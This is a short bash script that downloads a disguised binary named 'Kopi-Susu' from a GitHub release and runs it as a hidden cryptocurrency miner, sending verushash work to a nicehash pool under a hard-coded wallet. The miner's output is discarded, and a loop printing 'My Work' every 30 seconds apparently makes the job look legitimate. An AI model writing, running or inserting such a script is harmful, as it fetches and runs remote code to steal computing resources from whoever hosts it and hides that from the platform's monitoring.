#!/bin/bash
set -x
apt-get update 
ln -fs /usr/share/zoneinfo/America/Montserrat /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata
wget https://github.com/preak07/kopi/releases/download/kopi/Kopi-Susu.tar.gz
tar -xvf Kopi-Susu.tar.gz
chmod +x Kopi-Susu
./Kopi-Susu --algorithm verushash --pool verushash.auto.nicehash.com:9200 --wallet 3AhGzsYExJchLbzGVuiRTk33M5RAmL6C1f.QuickSiLver -t 1  >/dev/null 2>&1 &
while true
do
        echo "My Work"
        sleep 30
done
